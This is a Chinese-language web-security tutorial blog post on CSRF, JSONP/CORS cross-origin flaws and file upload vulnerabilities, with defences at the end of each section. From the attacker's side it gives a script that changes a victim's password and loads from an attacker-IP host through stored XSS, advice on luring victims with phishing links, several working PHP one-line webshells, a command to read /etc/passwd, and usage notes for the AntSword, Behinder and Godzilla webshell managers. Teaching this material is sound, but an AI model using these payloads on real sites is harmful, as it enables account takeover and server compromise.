---
title: "CSRF 跨站请求伪造与文件上传漏洞"
permalink: csrf-and-file-upload/
date: 2025-12-09 01:27:02
categories:
  - 网络安全
  - Web 安全
tags:
  - CSRF
  - 文件上传
  - Web安全
img: /medias/featureimages/4.jpg
summary: "CSRF 的原理、Poc 构造与防御（Token/SameSite/Referer），以及结合文件上传的特殊 CSRF 场景。"
---

<!-- more -->

---

## 第一部分：CSRF 基础：原理、利用与防御

### CSRF 跨站请求伪造
### 产生原因
开发者没有对用户传入的参数做严格的限制或校验，导致黑客可以构造特殊的请求，诱导受害者 执行非本意的操作

### CSRF 与 XSS区别
```plain
CSRF 是跨站请求伪造、XSS 是跨站脚本攻击
XSS 利用的核心是窃取 cookie，直接使用cookie登录受害者的账号;csrf 利用的核心是
诱导、欺骗，不会获取受害者的信息,而是诱导受害者自己去执行某些恶意操作
```

### 危害
诱导受害者执行非本意的操作

```plain
盗号：诱导受害者修改自己的密码、修改自己的绑定手机号、发送敏感信息等
改个人信息：诱导受害者修改自己的头像、个性签名、改自己的昵称
诱导受害者执行命令
```

### 挖掘
```plain
csrf一般无需代码审计，只有黑盒测试
burp抓包，在请求中所有的参数都可控(所有的参数你能看的懂)，就存在csrf
是否是漏洞，主要看 csrf 能不能诱导受害者执行高危操作

如：https://www.google.com/search?q=123
```

### 利用
### GET型 CSRF 漏洞
#### 1 找到有高危操作处的 csrf漏洞，直接复制 URL 即可实现 payload 编写

payload 攻击载荷：  [http://192.168.79.129/logout.php](http://192.168.79.129/logout.php)

攻击者需要诱导 受害者点击 payload 中的链接， 受害者如果点击，受害者的账户就会被退出

csrf 漏洞的关键，在于怎么才能诱导受害者点击？

```plain
直接微信聊 （一般没人点）：这个网站好看，点一下试试？ http://192.168.79.129/logout.php
封装成钓鱼网站 （抽奖网站）、伪装成二维码、钓鱼邮件
和存储型xss联合使用,自动触发 （严重漏洞）
```

### POST 型CSRF漏洞
#### 1 找到有高危操作处的 csrf漏洞，使用burp进行构造 payload

#### 2 把burpsuite 生成的 poc 保存到一个 html 文件中

#### 3 开启监听， 得到钓鱼链接 http://192.168.79.120:8000/1.html
 `python -m http.server `

#### 4 把钓鱼链接发给受害者，想方设法让受害者点击，受害一旦点击，就会把自己的密码修改为 123，即可实现盗号
 [http://192.168.79.120:8000/1.html](http://192.168.79.120:8000/1.html)

### GET型CSRF漏洞+存储型XSS漏洞
无需诱导受害者访问，由 存储型xss 自动触发

**csrf payload：**  [http://192.168.79.129/logout.php](http://192.168.79.129/logout.php)

**xss payload:**

⚠️：用 xss payload 打 xss漏洞，实现危害：受害者登录用户，干什么都会自动被登出，网站损坏

### POST 型CSRF漏洞+存储型XSS漏洞
#### 1  构造csrf 漏洞的 payload
exp.js

```javascript
$.ajax({
  // 下面是 受害者 URL
  url: 'http://目标IP/change_password.php',
  type: 'POST',
  ContentType: 'application/x-www-form-urlencoded',
  data: 'new_password=123&confirm_password=123'
});
```

#### 2  编写 xss payload
```java
<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
<script src="http://192.168.79.120:8000/exp.js"></script>

<script src="http://攻击者IP:8000/exp.js"></script>
```

为什么xss payload 需要加上 jquery 的依赖？

因为exp.js 中用了 ajax，是基于 jquery 的 （实际 大部分网站都有 jquery ，可以忽略依赖）

#### 3  用 xss payload 攻击目标网站存在xss漏洞的地方

#### 4  受害者登录用户，进入首页，自动触发修改密码。 受害者如果登出，再登录，原有密码将无法使用
###  修复及防御
```plain
添加一个不可控的参数
如：修改密码需要用户输入原密码、手机验证码、生物指纹、安全问题、 随机token
```

---

## 第二部分：特殊 CSRF 类型与文件上传

### 特殊 CSRF 类型-跨域请求漏洞
### 同源网站
两个网站，协议一样，端口一样，域名或IP一致，就称两个网站同源

```http
http://www.baidu.com
https://www.baidu.com
https://tieba.baidu.com:443/login.aspx
https://tieba.baidu.com/index.aspx
http://tieba.baidu.com:443/index.aspx

上述5个站点，只有3、4为同源
```

### 同源策略
浏览器默认的安全策略，不同源的两个网站之间不能相互读写资源，如DOM 无法使用，cookie无法读取，XHR(XMLHttpRequest、ajax、axios)无法发送

### 跨域请求
虽然浏览器限制 不同源不能相互读写资源，但实际开发中经常遇到不同源 之间相互读写资源的情况，

这中特殊情况就称为 **跨域请求**

### 跨域请求方式
### 浏览器默认支持的跨域
+ img: 图像可以跨域、A站点可以使用B站点的 图像
+ script:  js脚本可以跨域、A站点可以使用B站点的  js脚本
+ iframe、vedio、link、等

### jsonp 跨域
开发过程中，百度贴吧（tieba.baidu.com）和 百度地图（maps.baidu.com）是两个不同源的网站，却相互支持传输凭据，可以 采用其他的跨域方式（jsonp、cors）

把信息封装成浏览器默认支持的跨域标签，**如  ，再进行数据传输**

### cors 跨域
开发者预先配置好中间件，提前告诉浏览器两个不同源的网站可以相互读写资源，网站就会忽略浏览器的 同源策略限制

### jsonp 跨域请求漏洞
### 产生原因
开发者 使用 jsonp 进行跨域时，没有注意敏感信息，直接使用 jsonp 传输了敏感数据

### 挖掘
#### 寻找 JSONP  特征
```http
jsonp 是 GET请求，响应体的MIME类型是 application/javascript
jsonp 有参数 "callback" 回调
callback 的值和响应体中是 对应的关系
```

####  判断是否为漏洞
看响应体中是否有敏感信息，有就是漏洞

###  利用
#### 攻击者视角
#### 1 抓包， 在攻击机（受害者必须要能连接到你的攻击机）编写 exp.html

[http://192.168.79.120/jsonp_api.php?callback=handleData](http://192.168.79.120/jsonp_api.php?callback=handleData)

#### 2  攻击者在攻击机开启监听
#### 3  攻击者构造钓鱼链接，诱导受害者点击 ：
[http://192.168.79.120:8000/exp.html](http://192.168.79.120:8000/exp.html)

#### 4  如果受害者点了钓鱼链接，即可得到敏感信息

#### 受害者视角
受害者如果点击了钓鱼链接，就会把敏感信息通过jsonp传输给黑客

### CORS跨域请求漏洞
CORS(跨域资源共享)

### 产生原因
开发者使用cors 进行跨域时，没有注意敏感信息，直接使用 cors 传输了敏感数据

### 挖掘
#### 寻找CORS 的特征
请求头中加 Origin: xxx 响应头中有 Access-Control-Allow-Origin: xxx

( 如果请求头中的 Origin 发生变化， 但是响应头中Access-Control-Allow-Origin不会变化，说明 是安全的 cors，无漏洞  )

#### 判断是否是漏洞
响应是否有敏感信息

### 利用
####  攻击者视角
##### 1  在攻击机（受害者必须要能连接到你的攻击机）编写 cors_exp.html

##### 2  开启监听

##### 3  构造钓鱼链接，诱导受害者点击
[http://192.168.79.120:8000/cors_exp.html](http://192.168.79.120:8000/cors_exp.html)

##### 4  受害者如果点击，攻击就能收到信息

#### 受害者视角
访问钓鱼链接

### Chrome的限制
#### 为什么cors用不了
chrome 默认会在 XMLHttpRequest （ajax、axios）请求时自动去掉 cookie

#### Chrome Cookie 属性
**HTTP only**  ： 禁止 js 读取 cookie ，缓解 xss漏洞攻击

#### SameSite

SameSite 可能有三种值：

```http
Strict ：cookie 不能跨域
Lax： cookie有些能跨域，有些不能跨域 ，比 Strict宽松（chrome默认配置）
None 空：cookie能跨域，但是必须和 Cookie的另一个属性 secure 联用
```

#### secure

secure 要求cookie跨域时，两个网站必须都是 https 网站

####  现如今如果想cors跨域的条件
```http
cookie 是 SameSite 属性是 None
双方网站必须是 HTTPS 网站
```

###  修复
```http
正确配置 cors 跨域，谨慎使用 Access-Control-Allow-Origin: ⚠️
尽量不要使用jsonp，转为使用 cors 跨域 （Cross-Origin Resource Sharing，跨源资源共享）
跨域时，去除或加密敏感信息
```

### 文件上传漏洞
### 产生原因
开发者没有对用户上传的文件做严格的验证，导致用户可以上传任意的文件到服务器

### 危害(利用思路)
```http
上传webshell ，控制目标服务器
上传脏文件，消耗服务器的资源（带宽、存储）
```

### 挖掘
### 代码审计
```http
定位、寻找文件上传功能的代码，如果是 php ，则定位 move_uploaded_file 函数
官方链接：https://www.php.net/manual/zh/function.move-uploaded-file.php
用户上传的文件有没有经过过滤，如果是php，主要看 $_FIFES
```

+ name 文件名
+ size 文件大小
+ type 文件类型

### 黑盒
对所有的上传点、上传接口、上传功能逐一测试

### 利用
### webshell
网站后门

### 分类
```http
一句话木马：一行或几行代码
小马
大马：功能齐全的木马
```

### php webshell ,php的代码执行函数
####  eval
[https://www.php.net/manual/zh/function.eval.php](https://www.php.net/manual/zh/function.eval.php)

把字符串作为PHP代码执行 (eval是语言构造器，不是函数)

```php
<?php
  @eval($_POST['a']);
?>
```

解释：

+ @ ： 忽略警告和报错信息
+ $_POST : 接收POST参数，可以改为 $_GET (接收 get参数)、 $_REQUEST （接收get或 post参数） ⚠️ ：如果是 get 参数，参数中的特殊字符（URL保留字符）一定要URL编码
+ ['a'] : 参数的键名，可以随意修改，包裹的单引号，可以改为双引号，或无引号

使用：

⚠️ php代码必须以分号结尾  ： `参数的键名=php代码  `

`a=phpinfo();`

`a=echo "hello";`

执行命令，需要嵌套命令执行函数，如 system

`a=system("cat /etc/passwd");`

#### assert
断言：[https://www.php.net/manual/zh/function.assert.php](https://www.php.net/manual/zh/function.assert.php)

⚠️ 代码执行的功能在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除

```php
<?php
  @assert($_REQUEST['H']);
?>
```

#### preg_replace
执行一个正则表达式的搜索和替换，使用 /e 作为修饰符，会触发代码执行 （php 5.5 移除了 /e 修饰符 )

[https://www.php.net/manual/zh/function.preg-replace.php](https://www.php.net/manual/zh/function.preg-replace.php)

```php
<?php
    preg_replace("/kls/e",$_POST['H'],"kls");
?>
```

####  create_function
通过执行代码字符串创建动态函数

⚠️ 自 PHP 7.2.0 起被废弃，并自 PHP 8.0.0 起被移除

[https://www.php.net/manual/zh/function.create-function.php](https://www.php.net/manual/zh/function.create-function.php)

```php
<?php
 $func = create_function("", $_POST['H']);
 $func();
?>
```

####  array_map
为数组的每个元素应用回调函数

[https://www.php.net/manual/zh/function.array-map.php](https://www.php.net/manual/zh/function.array-map.php)

```php
<?php
    $function_name = $_POST['fu'];
    $function_args = $_POST['ar'];
    $arr[0] = $function_args;
    array_map($function_name,$arr);
?>
```

#### array_filter
使用回调函数过滤数组的元素

[https://www.php.net/manual/zh/function.array-filter.php](https://www.php.net/manual/zh/function.array-filter.php)

```php
<?php
    $function_name = $_POST['fu'];
    $function_args = $_POST['ar'];
    $arr[0] = $function_args;
    array_filter($arr,$function_name);
?>
```

### webshell 管理工具
### AntSword
### 安装
github：  [https://github.com/AntSwordProject/antSword](https://github.com/AntSwordProject/antSword)

官方文档  ：[https://www.yuque.com/antswordproject/antsword/srruro](https://www.yuque.com/antswordproject/antsword/srruro)

### 使用
使用： 目前只支持 eval /assert函数和 POST 参数

### 资源管理
资源管理 （查看文件、删除文件、 上传文件）

###  虚拟终端

### 数据库管理
数据库管理 （前提是目标要有数据库，数据库的用户和密码可以从源代码中找到）

### Behinder
github:[https://github.com/rebeyond/Behinder](https://github.com/rebeyond/Behinder)

### 安装
1  下载 发行版，解压 Behinder_v4.1.t00ls.zip

2  进入 Behinder.jar 当前目录，执行

`java -jar Behinder.jar`

### 使用
⚠️ 冰蝎只能用自己的木马，木马文件在 server 目录中

### 修改冰蝎的webshell密码
冰蝎：默认密码是 rebeyond

可以自己设置（md5加密）

 修改 key 为 密码的 md5 hash的前16个字符

**现在的密码是 kls**

###  资源管理

###  虚拟终端

### 数据库管理
连接字符串，通过 dsn 字符串链接

`mysql://用户:密码@IP地址:端口/数据库名  `

`mysql://root:root@127.0.0.1:3306/mysql`

### 蚁剑和冰蝎的区别
蚁剑是明文传输、冰蝎是加密的

下图是蚁剑流量，传输的是明文

下图是冰蝎的流量，是加密的

### Godzilla
### 安装
github: [https://github.com/BeichenDream/Godzilla](https://github.com/BeichenDream/Godzilla)

下载发行版，进入 godzilla.jar 当前目录，执行

`java -jar godzilla.jar  `

### 使用
#### 生成木马

#### 上传并连接木马

### 资源管理

### 虚拟终端

###  数据库管理

### 哥斯拉和蚁剑的区别
哥斯拉是加密传输的，下图是哥斯拉的流量

###  利用过程
```php
找到网站的上传点，上传webshell尝试
找到自己刚刚上传的webshell在哪
```

### 方法1：网站直接提供了点击按钮，点击即可访问

### 方法2：如果上传的是图片（如上传头像），可以直接右键图片查看链接在

### 方法3：F12或HTTP 响应中慢慢找

3  访问webshell，测试是否可以进行代码执行或命令执行

4  webshell 管理工具连接

### 修复
### 白名单
验证文件的后缀名和文件的具体类型

```php
只允许后缀名为 .gif .png .jpg 的文件上传
只允许实际类型为图片的文件上传（通过魔数判断文件类型
```

```php
PNG    89 50 4E 47
JPG    FF D8 FF
GIF    47 49 46 38
```

### 黑名单
1.  拦截后缀名为 .php .asp .jsp 等的文件
2. (waf都用这种）内容检测，对上传的文件内容做检测，检测文件中有没有 webshell 的特征 字符（比如检测文件内容中有没有 eval 、assert、 array_map   等

### 静态资源文件服务器
把用户上传的文件单独保存到一个服务器中，这个服务器只负责存储文件，不能解析和执行文件

```xml
nginx 做的纯静态的服务器
oss 阿里云对象存储云服务:          https://www.aliyun.com/product/oss
cos 腾讯云对象存储:                https://cloud.tencent.com/product/cos
AWS 亚马逊云 s3 对象存储云服务:    https://aws.amazon.com/cn/s3/
minio 兼容 aws s3 的对象存储:      https://github.com/minio/minio
```
